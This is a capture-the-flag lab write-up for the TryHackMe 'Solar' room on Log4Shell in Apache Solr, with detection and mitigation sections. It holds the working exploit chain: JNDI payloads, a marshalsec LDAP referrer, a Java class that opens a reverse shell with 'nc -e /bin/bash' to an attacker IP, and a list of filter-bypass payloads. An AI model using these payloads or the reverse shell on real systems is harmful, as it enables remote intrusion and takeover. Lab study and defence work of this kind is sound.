# Room
https://tryhackme.com/room/solar

# Task 1 - CVE-2021-44228 Intro
* CVE-2021-44228 impacts the Java logging package log4j and has a severity score of 10.0
* The attack offers trivial Remote Code Execution and has named Log4Shell
* Log4j is used by millions of applications around the world
* Resources
    * https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
    * https://log4shell.huntress.com/
    * https://www.youtube.com/watch?v=7qoPDq41xhQ

# Task 2 - Recon
* Scan the vulnerable machine
    ```
    nmap -v -A -T4 10.10.190.180
    ```

# Task 3 - Discovery
* The example machine is running Apache Solr 8.11.0 that includes a vulnerable version of log4j
* A connection to the machine in a web browser on port 8983 allows you to explore Solar
* Connect to the machine on port 8983 and answer the challenge questions
    * By default, the Solr log dir is /var/solr/logs
    * Open the attached Solr logs and review them, an interesting INFO entry is below
        ```
        2021-12-13 03:47:56.844 INFO  (qtp1083962448-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
        ```
    * /admin/cores is a URL that may be exploitable with the data entrypoint of params

# Task 4 - Proof of Concept
* Setting up the poc requires you to prefix the URL above with /solr, so: /solr/admin/cores
* Log4j adds logic to logs to enrich data, this logic may contain actions that could be executed
* A few examples are:
    ```
    ${$sys:os.name}
    ${ENV:PATH}
    ```
* The payload to abuse the log4j vulnerability is
    ```
    ${jndi:ldap://ATTACKERCONTROLLEDHOST}
    ```
* JNDI - Java Naming and Directory Interface
* The target of the attack will reach out to an LDAP endpoint controlled by an attacker
* You can insert this payload anywhere that data is logged by the application, for example:
    * Input boxes, user and password login forms, any data entry point in an application
    * HTTP headers like User-Agent and X-Forwared-For
    * Any form that has user supplied data
* JNDI Resource
    * https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
* poc in action
    * start a listener
    ```
    nc -nvlp 9999
    ```
    * curl the vulnerable machine with a call back to your listener on the attack box
    ```
    curl 'http://10.10.190.180:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.252.70:9999\}'
    ```
    * verify connection
    ```
    Listening on [0.0.0.0] (family 0, port 9999)
    Connection from 10.10.190.180 54972 received!
    0
    `\ufffd
    ```

# Task 5 - Exploitation
* In Task 4 you verified that you can catch a connection to the attacking machine from the target
* Transform that into an initial foothold to the target system, on the attacking machine:
    * Download and install Java 8 : jdk-8u181-linux-x64.tar.gz
    * Download and install git : sudo apt install git
    * Download and install maven : sudo apt install maven
    * Clone the marshalsec utility
        ```
        cd /opt
        git clone https://github.com/mbechler/marshalsec
        ```
    * Build the marshalsec utility with maven
        ```
        cd /opt/marshalsec
        mvn clean package -DskipTests
        ```
    * Launch the marshalsec utility as an LDAP referrer which will be used to redirect the LDAP request
        ```
        java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker_ip:attacker_port/#Exploit"
        ```
    * Create a malicious payload on the attacking machine and host it
        ```
        cd /tmp
        vi Exploit.java


        public class Exploit {
            static {
                try {
                    java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }

        javac Exploit.java -source 8 -target 8
        ls -lrta /tmp/Exploit.java
        python3 -m http.server
        ```
    * Start a listener, like in Task 4
        ```
        nc -nvlp 9999
        ```
    * Trigger the exploit
        ```
        curl 'http://10.10.43.85:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.52.236:1389/Exploit\}'
        {
        "responseHeader":{
            "status":0,
            "QTime":0},
        "initFailures":{},
        "status":{}}
        ```
    * Check the listener and your user
        ```
        nc -nvlp 9999
        Listening on [0.0.0.0] (family 0, port 9999)
        Connection from 10.10.43.85 44094 received!

        whoami
        solr
        ```

# Task 6 - Persistence
* From Task 5 you have an initial foothold, from there you can use any method you wish to explore persistence
* Check your user and stabilize the shell
    ```
    nc -nvlp 9999
    Listening on [0.0.0.0] (family 0, port 9999)
    Connection from 10.10.43.85 44094 received!

    whoami
    solr
    python3 -c "import pty; pty.spawn('/bin/bash')"
    solr@solar:/opt/solr/server$     
    ```
* Check sudo privileges for the current user
    ```
    sudo -l
    Matching Defaults entries for solr on solar:
        env_reset, exempt_group=sudo, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User solr may run the following commands on solar:
        (ALL) NOPASSWD: ALL
    solr@solar:/opt/solr/server$ 
    ```
* In this example solr is allowed to run any command as root so you can setup any persistence mechanism you wish.  For the real world, hopefully solr isn't granted this permission, in that case you would perform normal recon for elevation of privileges starting with some manual browsing or automatted means like LinEnum

# Task 7 - Detection
* Detection Resources
    * https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes
    * https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d
    * https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228
    * https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1
    * https://github.com/darkarnium/Log4j-CVE-Detect
    * https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/
* Example /var/solr/logs/solr.log with the exploit from tasks above
    ```
    2021-12-18 15:44:04.494 INFO  (main) [   ] o.e.j.s.Server Started @100891ms
    2021-12-18 15:59:13.617 INFO  (qtp1083962448-18) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=Reference Class Name: foo
    } status=0 QTime=50
    2021-12-18 15:59:51.373 INFO  (qtp1083962448-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://10.10.52.236:1389/Exploit}} status=0 QTime=0
    ```

# Task 8 - Bypasses
* Using edge filtering to rule out the static exploit referrer isn't enough, there are an unlimited amount of bypasses, a few are below
    ```
    ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}

    ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

    ${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}

    ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}

    ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}

    ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}

    ${${::-j}ndi:rmi://attackerendpoint.com/}
    ```
* Resources
    * https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/

# Task 9 - Mitigation
* Follow the patch guidelines from Apache
    * https://solr.apache.org/security.html
* Example
    ```
    locate solr.in.sh
    cd /etc/default
    sudo vi solr.in.sh
    SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"
    :wq
    sudo /etc/init.d/solr restart
    ```

# Task 10 - Patching
* Resources
    * https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/

# Task 11 - Credits